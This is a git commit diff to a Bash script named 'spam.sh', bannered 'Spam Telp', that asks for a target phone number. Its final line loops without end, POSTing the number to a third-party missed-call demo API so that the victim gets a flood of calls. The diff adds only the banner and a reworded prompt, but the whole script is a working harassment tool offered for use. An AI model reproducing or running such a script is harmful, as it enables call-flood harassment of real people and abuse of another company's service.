a090587361a2d3c7a51587f00027c5ebf918e5c5
Manjing2 <40186327+Manjing2@users.noreply.github.com>
2018-06-16 13:08:12 +0000

    Update spam.sh

--- spam.sh
+++ spam.sh
@@ -1,3 +1,10 @@
 #!/bin/bash
-read -p 'Nomer Target [Example +62896123xxx]: ' nmr
+echo "#######################################"
+echo "******-+-+-++[ Spam Telp ]++-+-+-******"
+echo "*       Mod Recode By: M Fauzan       *"
+echo "*           Code By: RoySan           *"
+echo "******-+-+-+++++++++++++++++-+-+-******"
+echo "#######################################"
+echo ""Tulis Nomer Target Disini Lalu (ENTER)"
+read -p '[Example +62896123xxx]: ' nmr
 while :;do curl -X POST -d "cid=$nmr&trying=0&spam_delay=10" https://www.citcall.com/demo/misscallapi.php;done
